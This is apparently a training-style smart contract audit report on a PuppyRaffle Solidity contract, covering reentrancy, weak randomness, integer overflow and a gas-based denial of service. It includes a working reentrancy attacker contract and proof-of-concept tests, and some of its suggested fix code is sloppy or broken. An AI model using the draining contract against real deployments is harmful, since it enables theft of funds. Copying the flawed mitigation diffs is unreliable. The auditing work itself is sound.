---
title: Protocol Audit Report
author: Big Audit
date: May 6, 2026
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---

\begin{titlepage}
    \centering
    \begin{figure}[h]
        \centering
        \includegraphics[width=0.5\textwidth]{logo.pdf} 
    \end{figure}
    \vspace*{2cm}
    {\Huge\PuppyRaffle Audit Report\par}
    \vspace{1cm}
    {\Large Version 1.0\par}
    \vspace{2cm}
    {\Large\itshape Big.io\par}
    \vfill
    {\large \today\par}
\end{titlepage}

\maketitle

<!-- Your report starts here! -->

Prepared by: [Eze](https://big.io)
Lead Auditors: 
- xxxxxxx

# Table of Contents
- [Table of Contents](#table-of-contents)
- [Protocol Summary](#protocol-summary)
- [Disclaimer](#disclaimer)
- [Risk Classification](#risk-classification)
- [Audit Details](#audit-details)
  - [Scope](#scope)
  - [Roles](#roles)
- [Executive Summary](#executive-summary)
  - [Issues found](#issues-found)
- [Findings](#findings)
- [High](#high)
- [Medium](#medium)
- [Low](#low)
- [Informational](#informational)
- [Gas](#gas)

# Protocol Summary

This project is to enter a raffle to win a cute dog NFT. The protocol should do the following:

1. Call the `enterRaffle` function with the following parameters:
   1. `address[] participants`: A list of addresses that enter. You can use this to enter yourself multiple times, or yourself and a group of your friends.
2. Duplicate addresses are not allowed
3. Users are allowed to get a refund of their ticket & `value` if they call the `refund` function
4. Every X seconds, the raffle will be able to draw a winner and be minted a random puppy
5. The owner of the protocol will set a feeAddress to take a cut of the `value`, and the rest of the funds will be sent to the winner of the puppy.

# Disclaimer

The Big Audit team makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the Solidity implementation of the contracts.

# Risk Classification

|            |        | Impact |        |     |
| ---------- | ------ | ------ | ------ | --- |
|            |        | High   | Medium | Low |
|            | High   | H      | H/M    | M   |
| Likelihood | Medium | H/M    | M      | M/L |
|            | Low    | M      | M/L    | L   |

We use the [CodeHawks](https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity) severity matrix to determine severity. See the documentation for more details.

# Audit Details 

- Commit Hash: 2a47715b30cf11ca82db148704e67652ad679cd8

## Scope 

```
./src/
#-- PuppyRaffle.sol
```

## Roles

Owner - Deployer of the protocol, has the power to change the wallet address to which fees are sent through the `changeFeeAddress` function.
Player - Participant of the raffle, has the power to enter the raffle with the `enterRaffle` function and refund value through `refund` function.

# Executive Summary
## Issues found
# Findings

## High

### [H-1] Reentrancy attack in `PuppyRaffle::refund()` allows entrant to drain raffle balance

**Description:** The `PuppyRaffle::refund()` doesnt follow CEI (checks, effect, interactions) and allows malicious actors drain the contract balance.

In the `PuppyRaffle::refund()` function, we first make an external call to the `msg.sender` address before updating the `PuppyRaffle::players` array

```javascript
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
@>      payable(msg.sender).sendValue(entranceFee);
@>      players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }
```
A player could have a `fallback` or `receive` function that calls the `PuppyRaffle::refund()` function again and claim another refun, they could continue the circle because the state is not updated after making an exernal call.


**Impact:** 

**Proof of Concept:**
1. User enters the raffle
2. Attackers sets up a contract with `fallback` function that calls `PuPPyRaffle::refund`
3. Attacker enters raffle
4. Attacker calls `PuppleRaffle::refund()` with their attack contract, draining the contract balance.

**Proof of Code**
paste the following in your test suite
<details>
<summary>code</summary>


```javascript
    function test_reenterancyRefund() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReenterancyAttacker attacker = new ReenterancyAttacker(puppyRaffle);
        address attackerAddress = makeAddr("attacker");
        vm.deal(attackerAddress, 1 ether);

        uint256 startingAttackerContractBalance = address(attacker).balance;
        uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;

        vm.prank(attackerAddress);
        attacker.attack{value: entranceFee}();

        console.log("Attacker contract balance before attack: ", startingAttackerContractBalance);
        console.log("PuppyRaffle balance before attack: ", startingPuppyRaffleBalance);

        console.log("Attacker contract balance after attack: ", address(attacker).balance);
        console.log("PuppyRaffle balance after attack: ", address(puppyRaffle).balance);
    }
```
and this contract as well

```javascript
contract ReenterancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable {
        _stealMoney();
    } 

    receive() external payable {
        _stealMoney();
    }
}
```

</details>

**Recommended Mitigation:** to prevent this, we should have the `PuppyRaffle::refund()` function update the `players` array before making the external call. Additionally, we should have the event emisiion up as well. 

```diff
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);
        payable(msg.sender).sendValue(entranceFee);

-       players[playerIndex] = address(0);
-       emit RaffleRefunded(playerAddress);
    }
```


### [H-2] Weak Randomness in `PuppyRaffle::selectWinnner` allows users to influuence or predict the winner and influence or predict the winning puppy.

**Description:** Hashing `msg.sender`, `block.timestamp`, and `block.difficulty` together creates a predictable number. ~A predictable number is not a good number. Malicious users can manipulates those values or know them ahead of time to choose raffle winners themselves.

*Note:* Users can frontrun this function and call `refund` if they see they are not the winner 

**Impact:** Any user can influence the winner of the raffle, winning the money and selecting the `rarest` puppy

**Proof of Concept:**

1. Validators can know ahead of time the `block.timestamp` and `block.difficulty` and use that to prdict when and how to paticipate. see ([solidity blog on prevrandao](https://soliditydeveloper.com/prevrandao)).`block.difficulty` was recently replaced with prevrandao.
2. User can mine/manipulate their `msg.sender` value to result in their address being used to generate the winner.
3. Users can revert their `selectWinner` transaction if they dont like the winner or resulting puppy

using on-chain values as a randomness seed is a well-documented attack vector.

**Recommended Mitigation:** Consider using a cryptographically provable random number generator such as Chainlink VRF.


### [H-3] Integer overflow of `PuppyRaffle::totalFee` loses fee

**Description:** In older solidity versions intergers were subject to integer overflow.

```javascript
uint64 myVar = type(uint64).max
// 18446744073709551615
myVar = myVar + 1
// myVar will be 0
```

**Impact:** in `PuppyRaffle::selectWinner`, `totalFees` are accumulated for the `feeAddress` to collect later in `PuppyRaffle::withdrawFees`. However if the `totalFees` variable overflows, the `feeAddress` may not collect amount of fees, leaving fees stuck in the contract

**Proof of Concept:**
- The test below proves that the fees collected will be less than the expected fee jusging by the number of entrants and entrance fee per participant.

- You wont be able to withdraw because of this line in `PuppyRaffle::withdrawFees`
```javascript
require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

<details> 
<summary>code</summary>

```javascript
function test_totalFeesOverflow() public {
        uint256 entranceFeePerPlayer = 1e18;
        uint256 numParticipants = 100;
        PuppyRaffle raffle = new PuppyRaffle(entranceFeePerPlayer, feeAddress, 1 days);

        // Setup many participants
        address[] memory players = new address[](numParticipants);
        for (uint256 i = 0; i < numParticipants; i++) {
            players[i] = address(uint160(1000 + i));
            vm.deal(players[i], 100 ether);
        }

        // Single raffle with 100 participants: (100 * 1e18 * 20%) = 20e18
        // This exceeds max uint64 (~18.4e18) causing overflow on first selectWinner
        uint256 totalCollected = numParticipants * entranceFeePerPlayer;
        uint256 feeExpected = (totalCollected * 20) / 100; // ~20e18

        vm.prank(players[0]);
        raffle.enterRaffle{value: totalCollected}(players);
        vm.warp(block.timestamp + 1 days + 1);
        vm.roll(block.number + 1);
        raffle.selectWinner();

        // After overflow, totalFees wraps to small value despite 20e18 collected
        uint64 reportedFees = raffle.totalFees();
        assert(uint256(reportedFees) < feeExpected);
    }
```
</details>

**Recommended Mitigation:** 
1. Use a newer solidity version and a `uint256` instead of a `uint64`
2. You could also use the `SafeMath` library of Openzeppelin for version 0.7.6.
3. Remove the balnce check from `PuppyRaffle::withdrawFee`

## Medium

### [M-1] Loopin through `PuppyRaffle::enterRaffle` is a potential DoS attack, Increments gas cost.

IMPACT - Medium
LIKELIHOOD - Medium

**Description:** `PuppyRaffle::enterRaffle` loops through the `players` array to check for duplicate players, however the longer the number of players the more checks a new player have to make making it more gas intensive as the number of players increases. Every additional address in the `players` array is an additional check the loop will have to make

**Impact:** The gas cost will dramatically increase as more players enter the raffle discouraging later users from entering. An attacker might make the `PuppyRaffle::entrants` array so big that no one else enters, guaranting them the winner.

**Proof of Concept:** 
<details>
<summary> PoC </summary>
The code bellow shows a test suites with proof of concept

```javascript
    function test_dos_attack() public {
        vm.txGasPrice(1);

        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        uint256 gasEnd = gasleft();

        uint256 gasUsedFirst = (gasStart - gasEnd);
        console.log("Gas used to enter raffle with 100 players: ", gasUsedFirst);

        // for second 100 players
        address[] memory playersTwo = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            playersTwo[i] = address(i + playersNum);
        }
        uint256 gasStartSecond = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(playersTwo);
        uint256 gasEndSecond = gasleft();

        uint256 gasUsedSecond = (gasStartSecond - gasEndSecond);
        console.log("Gas used to enter raffle with 100 players: ", gasUsedSecond);

        assert(gasUsedFirst < gasUsedSecond);
    }
```
</details>
- Gas for the first 100 players : ~6503222 gas
- Gas for second 100 players : 18995462 gas

**Recommended Mitigation:**
1. Consider allowing duplicates. Users can make new wallet addresses anyway.
2. Consider using a mapping to check duplicates 

```diff
+   mapping(address => uint256) public addressToRaffleId;
+   uint256 public raffleId = 0;


    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+           addressToRaffleId[newPlayer[i]] = raffleId;
        }
    

-       // Check for duplicates 
+       // check dupluicates only from new players
+       for (uint256 i = 0; i < newplayers.length; i++){
+       require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate Players");
+       }
-       for (uint256 i = 0; i < players.length - 1; i++) {
-           for (uint256 j = i + 1; j < players.length; j++) {
-               require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-           }
-       }
        emit raffleEntere(newPlayers);
    }
```


## Gas

### [G-1] Unchanged state variable should be declared constant or immutable.

Reading from storage is more expensive than reading from constants or immutable variables 

instances;
- `PuppyRaffle::raffleDuration` should be `immutable`
- `PuppyRaffle::commonImageUri` should be `constant`
- `PuppyRaffle::rareImageUri` should be `constant`
- ` PuppyRaffle::LegendaryImageUri` should be `constant`

### [G-2] storage variables ina a loop should be cached

Everytime you call `players.length` you read from storage as opposed to memory as in  `playersLength`

```diff
+   uint256 playersLength = players.length
-   for (uint256 i = 0; i < players.length - 1; i++) {
+   for (uint256 i = 0; i < playersLength - 1; i++)
-           for (uint256 j = i + 1; j < players.length; j++) {
+           for (uint256 j = i + 1; j < playersLength; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```

## Informational

### [I-1]: Solidity Pragma should be more specific, not wide.

**Description:** Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

### [I-2]: Using outdated solidity version is not recommended.

***Description***; solc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.

***Recommendation***;
Deploy with a recent version of Solidity (at least 0.8.0) with no known severe issues.

Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.

### [I-3]: Address State Variable Set Without Checks

Check for `address(0)` when assigning values to address state variables.